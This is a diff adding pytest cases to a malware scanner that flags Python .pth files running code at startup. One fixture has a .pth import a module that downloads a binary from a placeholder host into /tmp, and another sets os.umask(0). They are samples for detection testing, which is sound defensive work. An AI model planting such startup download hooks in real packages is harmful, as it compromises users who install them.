@@ -13212,20 +13212,68 @@ class TestWhatAPthImportsRunsAtStartup:
         )
         assert found, "the module a .pth imports was not read as startup code"
 
+    def test_a_module_a_pth_imports_that_downloads_at_startup(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "proxy_logging.pth": "import proxy.caching\n",
+                "src/proxy/__init__.py": "",
+                "src/proxy/caching.py": (
+                    "import os, urllib.request\n"
+                    "def cache_first():\n"
+                    "    base = os.environ.get('PROXY_BASE', 'https://cdn.example.invalid')\n"
+                    "    urllib.request.urlretrieve(base + '/native.bin', '/tmp/native.bin')\n"
+                    "cache_first()\n"
+                ),
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" in found
+
+    def test_a_pth_line_that_changes_the_process(self, tmp_path) -> None:
+        found = self.scan(tmp_path, {"pkg-setup.pth": "\n\nimport os; os.umask(0)\n"})
+        assert "MALWARE.INSTALL.STARTUP_CODE.001" in found
+
+    def test_namespace_coverage_and_path_lines_are_import_machinery(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "google-nspkg.pth": (
+                    "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
+                    "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));"
+                    "ie = os.path.exists(os.path.join(p,'__init__.py'));"
+                    "m = not ie and not has_mfs and sys.modules.setdefault('google', "
+                    "types.ModuleType('google'));"
+                    "mp = (m or []) and m.__dict__.setdefault('__path__',[]);"
+                    "(p not in mp) and mp.append(p)\n"
+                ),
+                "pytest-cov.pth": (
+                    "import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n  pass\\n')\n"
+                ),
+                "extra.pth": "import sys; sys.path.insert(0, '/opt/extra')\n",
+            },
+        )
+        assert not found
+
     def test_a_pth_importing_a_path_finder_is_quiet(self, tmp_path) -> None:
         found = self.scan(
             tmp_path,
             {
-                "proxy_paths.pth": "import proxy.finder; proxy.finder.install()\n",
+                "proxy_paths.pth": "import proxy.finder\n",
                 "src/proxy/__init__.py": "",
                 "src/proxy/finder.py": (
                     "import os, sys\n"
-                    "def install():\n"
-                    "    sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'vendor'))\n"
+                    "sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'vendor'))\n"
                 ),
             },
         )
         assert not found
+
+    def test_calling_into_the_imported_module_is_startup_code(self, tmp_path) -> None:
+        # `import M; M.f()` runs M's code in every interpreter: outside import machinery (the
+        # census holds 2 benign such lines in 17,337 packages: coverage.process_startup and a
+        # sensor bootstrap).
+        found = self.scan(tmp_path, {"boot.pth": "import boot; boot.start()\n", "boot.py": ""})
+        assert "MALWARE.INSTALL.STARTUP_CODE.001" in found
 
     def test_the_distutils_precedence_shim_is_quiet(self, tmp_path) -> None:
         found = self.scan(
